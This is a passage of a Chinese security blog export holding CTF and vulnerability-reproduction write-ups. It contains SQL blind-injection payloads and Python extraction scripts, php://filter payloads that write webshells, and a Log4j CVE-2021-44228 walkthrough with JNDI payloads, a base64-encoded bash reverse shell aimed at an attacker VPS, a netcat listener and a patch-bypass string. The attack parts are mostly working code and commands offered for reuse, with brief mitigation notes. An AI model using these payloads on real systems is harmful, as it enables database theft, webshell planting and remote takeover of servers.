<p>and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=111–+</p>
<p>and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name =’表名’ limit 0,1))=111–+</p>
<p>and ascii(substr((select  字段 from  表 limit 0,1))=111–+</p>
<p>这个是通过bp跑的其中一个图，里面长度有时候不好确认，我们可以添加Grep-Match进行匹配页面相关字符串进行筛选，方便我们统计s。</p>
<p><img src="/2021/01/10/SQL%E6%B3%A8%E5%85%A5/%E7%9B%B21.png" alt="盲1"></p>
<p>不会吧，不会吧，还有人不会写python盲注脚本吧，额好像在说我i</p>
<p>下面是 学习的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment">#bool盲注,二分盲注</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://injectx1.lab.aqlab.cn:81/Pass-10/index.php&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdatabase</span>():</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    database = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">        mid = (<span class="built_in">min</span>+<span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">max</span>&gt;<span class="built_in">min</span>:</span><br><span class="line">            payload = <span class="string">&quot;?id=1 and ascii(substr(database(),%d,1))&gt;%d&quot;</span> % (i,mid)    </span><br><span class="line">            <span class="comment">#数据库的第一位ascii值 &gt;mid  =&gt; 我们要使用&gt;%d,不然你下面if,else就要改</span></span><br><span class="line">            url1=url+payload</span><br><span class="line">            <span class="comment">#print(url1)</span></span><br><span class="line">            req=requests.get(url1,timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;No results found&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">max</span> = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">min</span> = mid+<span class="number">1</span></span><br><span class="line">            mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid&lt;=<span class="number">32</span> <span class="keyword">or</span> mid&gt;=<span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        database +=<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;database =&gt;&quot;</span>+database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getdatabase()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>当sleep被过滤后，可以考虑用笛卡尔积进行时间盲注：贴的大佬脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import *</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;59213b9c-a875-4ea3-994a-ab8b17cc4954.node3.buuoj.cn&#x2F;user&#x2F;login&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    min&#x3D;32</span><br><span class="line">    max&#x3D;128</span><br><span class="line">    while 1:</span><br><span class="line">        j&#x3D;min+(max-min)&#x2F;&#x2F;2</span><br><span class="line">        if j&#x3D;&#x3D;min:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        payload&#x3D;&quot;-1&#39;or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#&quot;.format(i,j)</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &#39;username&#39;:&#39;admin&#39;,</span><br><span class="line">            &#39;password&#39;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.7)</span><br><span class="line">            min&#x3D;j</span><br><span class="line">        except:</span><br><span class="line">            max&#x3D;j</span><br><span class="line">        sleep(0.4)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h1 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h1><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p><a href="https://blog.csdn.net/weixin_45345384/article/details/120888172">https://blog.csdn.net/weixin_45345384/article/details/120888172</a></p>
]]></content>
      <categories>
        <category>常见数据库注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2021-web</title>
    <url>/2021/03/29/VNCTF2021-web/</url>
    <content><![CDATA[<h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p><img src="/2021/03/29/VNCTF2021-web/1.png" alt="1"></p>
<p>玩游戏，太菜了，通不了关。自己复现总结下网上的wp。</p>
<p>F12看源码，重点看game.js</p>
<span id="more"></span>

<p><img src="/2021/03/29/VNCTF2021-web/2.png" alt="2"></p>
<p>####思路1</p>
<p>在game.js里面我们发现类似加密的东西。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;sojson.v4&#39;][&quot;\x66\x69\x6c\x74\x65\x72&quot;][&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;]((([&#39;sojson.v4&#39;]+[])[&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;][&#39;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#39;][&#39;\x61\x70\x70\x6c\x79&#39;](null,&quot;118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41&quot;[&#39;\x73\x70\x6c\x69\x74&#39;](&#x2F;[a-zA-Z]&#123;1,&#125;&#x2F;))))(&#39;sojson.v4&#39;);</span><br></pre></td></tr></table></figure>

<p>sojson.v4加密 在 <a href="http://oa.xiximiao.com/tools/_jsDec/index.html%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86">http://oa.xiximiao.com/tools/_jsDec/index.html进行解密</a></p>
<p><img src="/2021/03/29/VNCTF2021-web/3.png" alt="3"></p>
<h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h4><p>直接把加密内容丢控制台</p>
<p><img src="/2021/03/29/VNCTF2021-web/4.png" alt="4"></p>
<h4 id="思路3"><a href="#思路3" class="headerlink" title="思路3"></a>思路3</h4><p>在geme.js我们会发现一些代码，对应血量、血量上限、小回旋镖数量、大回旋镖数量、金币数量。</p>
<p><img src="/2021/03/29/VNCTF2021-web/5.png" alt="5"></p>
<p>我们可以在控制台修改响应值，玩游戏通过就行了</p>
<p><img src="/2021/03/29/VNCTF2021-web/6.png" alt="6"></p>
<h4 id="思路4"><a href="#思路4" class="headerlink" title="思路4"></a>思路4</h4><p><img src="/2021/03/29/VNCTF2021-web/7.png" alt="7"></p>
<p>网上人家说的这个地方在控制台输入winTimer.Set();即可拿到flag</p>
<p><img src="/2021/03/29/VNCTF2021-web/8.png" alt="8"></p>
<p>或者winTimer[“endTime”] =99也可以</p>
<h4 id="思路5"><a href="#思路5" class="headerlink" title="思路5"></a>思路5</h4><p>关键函数NextLevel()，一直跳下一关。。。</p>
<h2 id="naive"><a href="#naive" class="headerlink" title="naive"></a>naive</h2><p>这个真真不会，没有学过。</p>
<p><a href="https://blog.csdn.net/solitudi/article/details/114849641?spm=1001.2014.3001.5501%E6%9A%82%E6%97%B6%E4%B8%8D%E4%BC%9A%EF%BC%8C%E7%AD%89%E5%AD%A6%E4%B9%A0nodejs%E5%86%8D%E7%9C%8B%E7%9C%8B%E3%80%82">https://blog.csdn.net/solitudi/article/details/114849641?spm=1001.2014.3001.5501暂时不会，等学习nodejs再看看。</a></p>
<p><a href="https://www.icode9.com/content-4-891931.html">https://www.icode9.com/content-4-891931.html</a></p>
<h2 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h2>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>VNCTF2021-web</tag>
      </tags>
  </entry>
  <entry>
    <title>file_put_content利用(php://filter协议)</title>
    <url>/2020/10/25/file-put-contents%E5%88%A9%E7%94%A8-php-filter%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<hr>
<h3 id="0×01"><a href="#0×01" class="headerlink" title="0×01"></a>0×01</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(_FILE_);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>  = <span class="string">&#x27;&lt;?php exit(); ?&#x27;</span>. <span class="variable">$filename</span>;</span><br><span class="line">file_put_content(<span class="variable">$filename</span>,<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>



<p><code>exit</code>加在filename前面，会导致写入的内容不能执行。（利用php base64_decode函数特性去除“死亡exit”）</p>
<span id="more"></span>

<blockquote>
<p>Payload:     </p>
<p>/?file=filter/write=convert.base64-deconde|aPD9waHAgcGhwaW5mbygpOz8+/recource=shell.php </p>
<p>/?file = php://filter/write=string.rot13|<code>&lt;?cuc cucvasb();?&gt;</code>/resource=shell.php    rot13编码</p>
</blockquote>
<h3 id="0×02"><a href="#0×02" class="headerlink" title="0×02"></a>0×02</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>



<p>base64可打印（A-Z a-z 0-9 +/）<code>=</code>补位  ,遇到不符合的字符会跳过，所以&lt; ? ; ? &gt;; 和空格 七个字符不符合，</p>
<p>最终解码只有<code>phpexit</code>7个字符，base64解码是4个一组的，所有要在shell前面加个a,</p>
<blockquote>
<p>Payload: </p>
<p>/?txt=aPD9waHAgcGhwaW5mbygpOz8+&amp;filename=php://filter/write=convert.base64-deconde/resource=shell.php       //PD9waHAgcGhwaW5mbygpOz8+前面要多加一个a</p>
</blockquote>
<hr>
<p>参考博客：<a href="https://www.cnblogs.com/vege/p/12650702.html">https://www.cnblogs.com/vege/p/12650702.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>file_put_content</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j2远程代码执行漏洞</title>
    <url>/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）"><a href="#Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）" class="headerlink" title="Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）"></a>Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就<code>Java的日志记录工具</code>。该工具重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p>
<p>log4j2中存在<code>JNDI注入漏洞</code>，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上<code>执行任意代码</code>。</p>
<span id="more"></span>

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>攻击者可以通过 log4j 的 lookup 替换功能向其配置文件的任意位置注入代码（类似 SQL 注入，把 变量替换为{实际代码}），再加上这些版本中用到的 JNDI 特性并没有为 LDAP 提供足够的保护，使得注入的任意代码都能被执行。</p>
<p>先说下利用exp：${jndi:rmi://127.0.0.1:1099/exp}   (rmi/ldap ，两者部分功能类似，但也有不同点)      再直白点来说就是 用户提交的${jndi:rmi://127.0.0.1:1099/exp} ，被日志捕获到，然后如果log4j2 又开启了 Jndi Lookup功能，就能解析用户提交的exp，发送rmi请求，远程调用一些反序类化的方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JNDI：Java 命名与目录接口，提供了用名称来访问资源的能力</span><br><span class="line">LDAP：轻型目录访问协议，定义了如何访问目录服务中的内容</span><br><span class="line"></span><br><span class="line">两者配合，可以完成对服务器目录的操作，比如增删改查。</span><br></pre></td></tr></table></figure>



<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
<li>  Apache Log4j 2.x &lt; 2.15.0-rc2</li>
<li><strong>供应链影响范围</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Spring-Boot-strater-log4j2</span><br><span class="line"></span><br><span class="line">Apache Struts2</span><br><span class="line"></span><br><span class="line">Apache Solr</span><br><span class="line"></span><br><span class="line">Dubbo</span><br><span class="line"></span><br><span class="line">Redis</span><br><span class="line"></span><br><span class="line">Logstash</span><br><span class="line"></span><br><span class="line">Kafka</span><br><span class="line"></span><br><span class="line">Apache Flink</span><br><span class="line"></span><br><span class="line">Apache Druid</span><br><span class="line"></span><br><span class="line">ElasticSearch</span><br><span class="line"></span><br><span class="line">Flume</span><br><span class="line"></span><br><span class="line">等</span><br></pre></td></tr></table></figure>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞环境：vulfocus(<a href="http://vulfocus.fofa.so/#/dashboard">http://vulfocus.fofa.so/#/dashboard</a></p>
<p>vulfocus.fofa.so:44873</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213002417059.png" alt="image-20211213002417059"></p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a><code>漏洞验证</code></h4><p>打开<a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a>  get subdomain</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213002813058.png" alt="image-20211213002813058"></p>
<p>输入payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;ip&#x2F;exp&#125;</span><br><span class="line"></span><br><span class="line">payload  这个参数名字不能错</span><br><span class="line">ip暂时换上对应域名</span><br></pre></td></tr></table></figure>



<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213002723533.png" alt="image-20211213002723533"></p>
<p>返回dnslog，refresh一下，可以看到记录，说明，请求了该域名，证明漏洞可能存在（极大几率）</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213003146701.png" alt="image-20211213003146701"></p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><code>反弹shell</code></h4><p>需要<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">jndi注入工具</a>构造反弹shell命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br><span class="line">-C - 远程class文件中要执行的命令。命令会被作为参数传入Runtime.getRuntime().exec()，所以需要确保命令传入exec()方法可执行。</span><br><span class="line">-A - 服务器地址，可以是IP地址或者域名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzEwMDE1IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;1.1.1.1&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzEwMDE1IDA+JjE=  是反弹shell的base64加密   只需要修改成反弹到vps的ip端口</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213004824709.png" alt="image-20211213004824709"></p>
<p>-A “1.1.1.1”   1.1.1.1换成自己vps的ip</p>
<p>在vps上启动 JNDI-Injection-Exploit，这里生成的有 JNDI链接，一会使用最后 JNDI链接，其他的没有成功 （确保 <strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口可用，不被其他程序占用）</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213013010020.png" alt="image-20211213013010020"></p>
<p>再开个框，对我们反弹shell的端口进行监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvnp 10015</span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213005641455.png" alt="image-20211213005641455"></p>
<p>payload=${jndi:ldap://ip/exp} 修改为 payload=${jndi:rmi://106.xx.xx.xx:1099/jwbmm8} (ldap://ip/exp替换成生成的 JNDI链接，上面生成的有)</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213012806412.png" alt="image-20211213012806412"></p>
<p>复现时间超时，靶场端口变了，不影响</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213013101617.png" alt="image-20211213013101617"></p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213012602963.png" alt="image-20211213012602963"></p>
<p>成功反弹shell</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213012641273.png" alt="image-20211213012641273"></p>
<p>找到flag</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213013340992.png" alt="image-20211213013340992"></p>
<p>注意：vps对应端口一定要开放，</p>
<hr>
<p><a href="https://mp.weixin.qq.com/s/IZVR33igxU1mhAQlow7C2Q">参考</a></p>
<p><a href="https://mp.weixin.qq.com/s/JtNoGVpDlom1kC3h9CoLTQ">参考1</a></p>
<p><a href="https://mp.weixin.qq.com/s/4On4wXxchioqIHTsCJPq3w">原理参考2</a></p>
<p><a href="https://mp.weixin.qq.com/s/IxXGcpjN6KkDGPQYPJXHTA">原理参考3</a></p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><h4 id="补丁之前"><a href="#补丁之前" class="headerlink" title="补丁之前"></a>补丁之前</h4><ol>
<li>可升级jdk版本至6u211 / 7u201 / 8u191 / 11.0.1以上，可以在一定程度上限制JNDI等漏洞利用方式。</li>
<li>关闭<code>lookup</code>功能，即：设置 JVM 启动参数 - <code>Dlog4j2.formatMsgNoLookups=true</code></li>
</ol>
<h4 id="更新到rce1"><a href="#更新到rce1" class="headerlink" title="更新到rce1"></a>更新到rce1</h4><p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1%E3%80%82">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1。</a></p>
<p>但不久就被绕过了，经过测试发现<code>URI</code>中不进行<code>URL</code>编码会报这个错，加个空格即可触发<code>$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125;</code>（需要用户开启<code>lookup</code>功能的基础上才可以）</p>
<h4 id="更新到rce2"><a href="#更新到rce2" class="headerlink" title="更新到rce2"></a>更新到rce2</h4><p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
<p>貌似又被绕过了</p>
<hr>
<p>下次分析下fastjson反序列化漏洞原理，和这个漏洞类似</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>log4j2</tag>
      </tags>
  </entry>
  <entry>
    <title>middleware</title>
    <url>/2022/03/20/middleware-java/</url>
    <content><![CDATA[<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>默认端口：<code>7001</code></p>
<p>部分历史漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 弱口令&#x2F;任意文件读取+后台war包&#x2F;任意文件上传getshell</span><br><span class="line">2. CVE-2017-20271</span><br><span class="line">3. CVE-2018-2628</span><br><span class="line">4. CVE-2019-2725</span><br><span class="line">5. CVE-2020-2555</span><br><span class="line">6. CVE-2021-2394</span><br><span class="line"></span><br></pre></td></tr></table></figure>

